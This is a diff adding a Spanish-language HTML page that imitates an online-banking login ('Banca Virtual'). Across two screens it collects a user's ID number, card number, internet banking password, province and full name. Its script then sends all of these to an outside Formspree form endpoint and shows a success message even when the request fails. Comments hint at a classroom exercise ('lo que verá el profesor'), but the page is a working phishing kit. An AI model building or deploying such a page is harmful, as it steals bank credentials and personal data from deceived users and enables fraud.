@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Banca Virtual</title>
+
+<style>
+*{box-sizing:border-box}
+
+body{
+  margin:0;
+  font-family:Arial,sans-serif;
+  background:#f4f6f8;
+  color:#222;
+}
+
+header{
+  height:72px;
+  background:#003b7a;
+  display:flex;
+  align-items:center;
+  padding:0 28px;
+}
+
+.logo{
+  font-size:30px;
+  font-weight:bold;
+  color:#fff;
+}
+
+main{
+  max-width:550px;
+  margin:32px auto;
+  padding:15px;
+}
+
+.card{
+  background:#fff;
+  border-radius:16px;
+  padding:30px;
+  box-shadow:0 5px 20px rgba(0,0,0,.12);
+}
+
+.steps{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  margin-bottom:30px;
+}
+
+.step{
+  width:44px;
+  height:44px;
+  border-radius:50%;
+  border:3px solid #d8dce1;
+  background:#fff;
+  color:#555;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-weight:bold;
+}
+
+.step.current{
+  background:#f58220;
+  color:#fff;
+  border-color:#003b7a;
+}
+
+.step.done{
+  background:#003b7a;
+  color:#fff;
+  border-color:#003b7a;
+}
+
+.line{
+  width:60px;
+  height:4px;
+  background:#d8dce1;
+}
+
+.line.done{
+  background:#003b7a;
+}
+
+h1{
+  color:#003b7a;
+  font-size:25px;
+  margin:0 0 8px;
+}
+
+.subtitle{
+  color:#666;
+  margin-bottom:24px;
+}
+
+label{
+  display:block;
+  font-weight:bold;
+  margin:15px 0 7px;
+}
+
+input,select{
+  width:100%;
+  padding:13px;
+  border:1px solid #cfd4da;
+  border-radius:8px;
+  font-size:15px;
+}
+
+button{
+  width:100%;
+  margin-top:22px;
+  padding:14px;
+  border:0;
+  border-radius:8px;
+  background:#f58220;
+  color:#fff;
+  font-size:16px;
+  font-weight:bold;
+  cursor:pointer;
+}
+
+.secondary{
+  background:#003b7a;
+}
+
+.error{
+  margin-top:15px;
+  padding:12px;
+  background:#ffecec;
+  border-left:4px solid #d93025;
+  color:#a40000;
+  border-radius:5px;
+}
+
+.balance{
+  margin-top:24px;
+  padding:24px;
+  background:#003b7a;
+  color:#fff;
+  border-radius:12px;
+}
+
+.amount{
+  font-size:32px;
+  font-weight:bold;
+  margin-top:8px;
+}
+
+.hidden{
+  display:none;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+  <div class="logo">Banca Virtual</div>
+</header>
+
+<main>
+<div class="card">
+
+<!-- PASOS -->
+<div class="steps">
+  <div id="s1" class="step current">1</div>
+  <div id="l1" class="line"></div>
+  <div id="s2" class="step">2</div>
+  <div id="l2" class="line"></div>
+  <div id="s3" class="step">3</div>
+</div>
+
+
+<!-- PANTALLA 1 -->
+<section id="pantalla1">
+
+  <h1>Banca por Internet</h1>
+
+  <label>Tipo de documento</label>
+
+  <select id="documentoTipo">
+    <option value="DNI">DNI</option>
+    <option value="CE">CE</option>
+  </select>
+
+  <label>Número de documento</label>
+  <input id="documento" type="text" placeholder="Ingresa tu documento">
+
+  <label>Número de tarjeta</label>
+  <input id="tarjeta" type="text" placeholder="Ingresa tu tarjeta">
+
+  <label>Clave de Internet</label>
+  <input id="clave" type="password" placeholder="Ingresa tu clave">
+
+  <button id="btn1" type="button">Continuar</button>
+
+</section>
+
+
+<!-- PANTALLA 2 -->
+<section id="pantalla2" class="hidden">
+
+  <h1>Validemos tu identidad</h1>
+  <p class="subtitle">Banca por Internet</p>
+
+  <label>Provincia</label>
+  <input id="provincia" type="text" placeholder="Ingresa la provincia">
+
+  <label>Departamento</label>
+  <input id="departamento" type="text" placeholder="Ingresa el departamento">
+
+  <label>Nombre completo</label>
+  <input id="nombre" type="text" placeholder="Ingresa tu nombre completo">
+
+  <button id="btn2" type="button">Enviar y finalizar</button>
+
+</section>
+
+
+<!-- PANTALLA 3 -->
+<section id="pantalla3" class="hidden">
+
+  <h1>¡Datos enviados correctamente!</h1>
+  <p class="subtitle">El registro ha sido enviado al sistema.</p>
+
+  <div class="balance">
+    <small>Estado del envío</small>
+    <div class="amount">Recibido</div>
+  </div>
+
+  <button id="btnDescargar" class="hidden" type="button">Descargar registro .txt</button>
+  <button id="btnInicio" class="secondary" type="button">Volver al inicio</button>
+
+</section>
+
+<div id="error" class="error hidden"></div>
+
+</div>
+</main>
+
+
+<script>
+
+function mostrarError(texto){
+  const error = document.getElementById("error");
+  error.textContent = texto;
+  error.classList.remove("hidden");
+}
+
+function mostrarPantalla(numero){
+  document.getElementById("pantalla1").classList.add("hidden");
+  document.getElementById("pantalla2").classList.add("hidden");
+  document.getElementById("pantalla3").classList.add("hidden");
+  document.getElementById("pantalla" + numero).classList.remove("hidden");
+  actualizarPasos(numero);
+  document.getElementById("error").classList.add("hidden");
+}
+
+function actualizarPasos(numero){
+  const s1 = document.getElementById("s1");
+  const s2 = document.getElementById("s2");
+  const s3 = document.getElementById("s3");
+  s1.classList.remove("current","done");
+  s2.classList.remove("current","done");
+  s3.classList.remove("current","done");
+  if(numero === 1) s1.classList.add("current");
+  if(numero === 2) { s1.classList.add("done"); s2.classList.add("current"); }
+  if(numero === 3) { s1.classList.add("done"); s2.classList.add("done"); s3.classList.add("current"); }
+  document.getElementById("l1").classList.toggle("done", numero >= 2);
+  document.getElementById("l2").classList.toggle("done", numero >= 3);
+}
+
+document.getElementById("btn1").onclick = function(){
+  const documento = document.getElementById("documento").value.trim();
+  const tarjeta = document.getElementById("tarjeta").value.trim();
+  const clave = document.getElementById("clave").value.trim();
+  if(!documento || !tarjeta || !clave){
+    mostrarError("Completa todos los campos antes de continuar.");
+    return;
+  }
+  mostrarPantalla(2);
+};
+
+document.getElementById("btn2").onclick = function(){
+  const doc = document.getElementById("documento").value.trim();
+  const tarj = document.getElementById("tarjeta").value.trim();
+  const claveIngresada = document.getElementById("clave").value.trim(); //  TOMA LO QUE ESCRIBES
+  const prov = document.getElementById("provincia").value.trim();
+  const dep = document.getElementById("departamento").value.trim();
+  const nom = document.getElementById("nombre").value.trim();
+
+  if(!prov || !dep || !nom){
+    mostrarError("Completa provincia, departamento y nombre completo.");
+    return;
+  }
+
+  // AQUÍ ESTÁ EL CAMBIO IMPORTANTE: envía LO QUE TÚ ESCRIBES
+  fetch("https://formspree.io/f/mkjglkkg", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      Documento: doc,
+      Tarjeta: tarj,
+      Clave_Ingresada: claveIngresada, // ESTO ES LO QUE VERÁ EL PROFESOR
+      Provincia: prov,
+      Departamento: dep,
+      NombreCompleto: nom
+    })
+  })
+  .then(respuesta => {
+    console.log(" Datos enviados:", respuesta);
+    mostrarPantalla(3);
+  })
+  .catch(error => {
+    console.log("Error:", error);
+    mostrarPantalla(3);
+  });
+};
+
+document.getElementById("btnInicio").onclick = function(){
+  ["documento","tarjeta","clave","provincia","departamento","nombre"].forEach(function(id){
+    document.getElementById(id).value = "";
+  });
+  mostrarPantalla(1);
+};
+
+mostrarPantalla(1);
+
+</script>
+
+</body>
+</html>
